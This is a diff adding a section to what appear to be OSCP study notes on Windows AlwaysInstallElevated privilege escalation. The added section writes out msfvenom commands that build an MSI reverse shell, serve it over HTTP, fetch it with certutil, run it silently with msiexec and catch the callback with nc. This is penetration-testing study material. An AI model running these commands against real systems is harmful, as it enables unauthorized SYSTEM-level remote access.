@@ -341,6 +341,21 @@ msiexec /quiet /qn /i \\$LocalIP\share\shell.msi
 msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
+For a callback rather than a local user, generate an MSI reverse shell, serve it from the attack box, download it to a writable target directory, and start a listener. Both registry values must be `1`; checking only one hive is insufficient.
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port2 -f msi -o $BoxDir/www/system-shell.msi
+python3 -m http.server $TransferPort --directory $BoxDir/www
+nc -lvnp $Port2
+```
+
+```cmd
+certutil -urlcache -split -f http://$LocalIP:$TransferPort/system-shell.msi C:\Windows\Temp\system-shell.msi
+msiexec /quiet /qn /i C:\Windows\Temp\system-shell.msi
+```
+
+Verify the callback with `whoami` and `cd`/`echo %CD%`, then clean the downloaded MSI and any temporary payload files when the assessment allows. See [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].
+
 ---
 
 ---
@@ -854,6 +869,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- both AlwaysInstallElevated policy values enabled, MSI callback, and SYSTEM verification
 
 ## Fermion application note: verify the task before replacing the binary
 
